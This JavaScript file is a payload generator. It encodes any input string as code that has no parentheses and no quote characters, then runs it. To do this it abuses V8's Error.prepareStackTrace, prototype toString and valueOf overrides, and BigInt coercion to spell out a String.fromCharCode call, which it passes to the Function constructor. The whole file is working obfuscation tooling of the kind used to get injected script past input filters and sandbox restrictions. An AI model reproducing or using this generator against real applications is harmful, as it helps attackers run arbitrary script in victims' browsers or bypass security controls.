
// initialize digits from 0 to 9
init_digits = 'x=Set,x.toString=Array.prototype.indexOf,a=x+-x,b=a+-x,c=b+-x,d=c+-x,e=d+-x,f=e+-x,g=f+-x,h=g+-x,i=h+-x,j=i+-x,x.valueOf=Array.prototype.join,a+=x,b+=x,c+=x,d+=x,e+=x,f+=x,g+=x,h+=x,i+=x,j+=x'

// get special characters -> = ( ) [ ] " 
/*
* // setup error prototype
* delete Error.name;
* Error.message = Array;
* Error.toString = Error.prototype.toString;
* toStrBackup=Array.prototype.toString // backup the original array to string function
* Array.prototype.toString = Array.prototype.lastIndexOf; // gets -1 
* Error.prepareStackTrace = String.prototype.split;
* 
* // generate function Date ....
* er = new Error;
* er.toString = Array.prototype.join; // gets ''
* r = er.stack;
* 
* // inject commas 
* r.toString = toStrBackup;
* Error.message = r;
* er = new Error;
* er.toString = Array.prototype.join; // gets ''
* r = er.stack;
* 
* // traverse string
* r.toString = Array.prototype.shift
* y=BigInt,y.valueOf=Array.prototype.join
* 
* 
* // get comma 
* com = r+y
* com = r+y
* 
* // letter u 
* lu = r+y
* 
* // letter n 
* ln = r+y
* ln = r+y
* 
* // letter t 
* lt = r+r+r+y
* lt = r+y
* 
* // get space 
* spa = r+r+r+r+r+r+r+y
* spa = r+y
* 
* // letter r
* lr = r+r+r+y
* lr = r+y
* 
* // open parenthesis 
* po = r+r+r+r+r+r+r+y
* po = r+y
* 
* // close parenthesis 
* pc = r+y
* pc = r+y
* 
* // open bracket 
* bro = r+r+r+r+r+r+r+y
* bro = r+y
* 
* // letter e 
* le = r+r+r+r+r+r+r+r+r+r+r+y
* le = r+y
* 
* // close bracket 
* brc = r+r+r+r+r+r+r+r+r+r+r+y
* brc = r+y
* 
* // get equals and quote 
* y.valueOf=String.prototype.fontcolor
* Error.message = y+y;
* er = new Error;
* er.toString = Array.prototype.join; // gets ''
* r = er.stack;
* r.toString = Array.prototype.shift
* y=BigInt,y.valueOf=Array.prototype.join
* quo = r+r+r+r+r+r+r+r+r+r+r+r+y
* quo = r+y
* 
* payload = lr+le+lt+lu+lr+ln+spa+String.name+bro+quo+String.fromCharCode.name+quo+brc+po
*/
init_state = 'delete Error.name,Error.message=Array,Error.toString=Error.prototype.toString,toStrBackup=Array.prototype.toString,Array.prototype.toString=Array.prototype.lastIndexOf,Error.prepareStackTrace=String.prototype.split,er=new Error,er.toString=Array.prototype.join,r=er.stack,r.toString=toStrBackup,Error.message=r,er=new Error,er.toString=Array.prototype.join,r=er.stack,r.toString=Array.prototype.shift,y=BigInt,y.valueOf=Array.prototype.join,com=r+y,com=r+y,lu=r+y,ln=r+y,ln=r+y,lt=r+r+r+y,lt=r+y,spa=r+r+r+r+r+r+r+y,spa=r+y,lr=r+r+r+y,lr=r+y,po=r+r+r+r+r+r+r+y,po=r+y,pc=r+y,pc=r+y,bro=r+r+r+r+r+r+r+y,bro=r+y,le=r+r+r+r+r+r+r+r+r+r+r+y,le=r+y,brc=r+r+r+r+r+r+r+r+r+r+r+y,brc=r+y,y.valueOf=String.prototype.fontcolor,Error.message=y+y,er=new Error,er.toString=Array.prototype.join,r=er.stack,r.toString=Array.prototype.shift,y=BigInt,y.valueOf=Array.prototype.join,quo=r+r+r+r+r+r+r+r+r+r+r+r+y,quo=r+y';

// construct the decoder payload 
payload_start = 'payload=lr+le+lt+lu+lr+ln+spa+String.name+bro+quo+String.fromCharCode.name+quo+brc+po';

// eighth way to call javascript functions without params 
code_execution = 'Object.prototype.message=payload,Array.prototype.toString=Error.prototype.toString,Error.prepareStackTrace=Function,errr=new Error,errr.toString=errr.stack,result=errr+y'

function initialize_integer(number) { 
  let letters = String(number)
                          .split('')
                          .map(n=>String.fromCharCode(Number(n)+97));
  return letters.join('')+"="+letters.join("+");  
}

function int_to_var(number) {
  return String(number)
                  .split('')
                  .map(n=>String.fromCharCode(Number(n)+97))
                  .join('');
}

function generate_payload(input) { 
  
  // get unique characters from the input
  characters = input
                  .split('')
                  .filter((e, i, self) => i === self.indexOf(e));
  
  // initialize placeholders 
  init_variables = characters
                      .map(x=>x.charCodeAt(0))
                      .map(initialize_integer)
                      .join(',')
  
  // construct input string from variables
  string_construction = [payload_start,
                         input
                          .split('')
                          .map(x=>x.charCodeAt(0))
                          .map(x=>int_to_var(x))
                          .join('+com+'),
                          "pc"].join('+')
  
  return [init_digits,init_state,init_variables,string_construction,code_execution].join(',')
}
